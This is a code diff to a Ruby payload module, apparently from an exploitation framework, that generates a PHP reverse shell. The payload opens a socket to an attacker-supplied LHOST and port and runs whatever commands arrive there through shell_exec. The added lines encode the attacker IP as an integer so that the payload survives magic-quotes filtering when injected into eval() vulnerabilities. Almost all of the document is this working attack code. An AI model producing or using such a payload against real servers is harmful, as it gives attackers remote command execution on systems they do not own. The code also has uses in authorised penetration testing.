@@ -31,19 +31,30 @@ module ReversePhp
 			))
 	end
 
+
+
+
 	#
 	# PHP Reverse Shell
 	#
 	def php_reverse_shell
+
+	        #
+       		# inet_aton to bypass magic quotes protection for eval() vulnerarilities 
+        	#
+
+        	if datastore['LHOST']
+            		ipaddr = datastore['LHOST'].split(/\./).map{|c| c.to_i}.pack("C*").unpack("N").first
+        	end
+
 		shell = <<-END_OF_PHP_CODE
 		error_reporting(E_ALL);
 		$service_port = #{datastore['LPORT']};
 
-		$address = "#{datastore['LHOST']}";
 		$socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
-		$result = socket_connect($socket, $address, $service_port);
+		$result = socket_connect($socket, #{ipaddr}, $service_port);
 
-		$command = '';
+		$command = NULL;
 
 		while ($command = socket_read($socket, 2048)) {
         		$output = shell_exec(substr($command, 0, -1));
